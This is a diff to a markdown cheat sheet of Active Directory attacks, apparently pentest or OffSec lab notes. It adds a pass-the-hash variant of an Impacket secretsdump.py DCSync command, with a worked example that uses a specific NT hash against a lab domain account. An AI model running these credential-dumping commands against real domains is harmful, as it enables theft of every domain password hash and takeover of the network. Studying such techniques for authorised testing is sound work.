@@ -50,7 +50,15 @@ Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
 ```bash
 secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
 ```
-
+##### Using Hash
+```shell
+secretsdump.py -outputfile domain_hashes -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+```
+**Example**
+```shell
+secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee':'007A95BE1BE6ED38DEB848A388655B05' 'heist.offsec'/'svc_apache$'@<domain-ip>
+```
+Use 'aad3b435b51404eeaad3b435b51404ee' for the LMHash field
 - **Parameters:**
     - `YOURDOMAIN`: Replace with your actual domain name.
     - `targetUser`: The username that has replication privileges.
